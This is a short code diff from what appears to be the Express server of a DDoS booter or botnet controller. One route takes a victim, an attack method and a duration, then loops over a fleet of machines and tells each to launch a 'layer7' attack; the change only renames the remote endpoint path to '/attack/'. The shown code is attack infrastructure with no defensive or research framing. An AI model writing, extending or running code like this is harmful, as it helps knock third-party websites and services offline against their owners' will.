@@ -488,7 +488,7 @@ app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', async (req, res) 
     for (let index = 0; index < (machines.all).length; index++) {
         let currentMachine = ((machines.all)[index])
         machines.asked.push(currentMachine)
-        await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
+        await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port}/attack/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
             .then(res => {
                 console.log(res.data)
                 machines.responded.push(currentMachine)
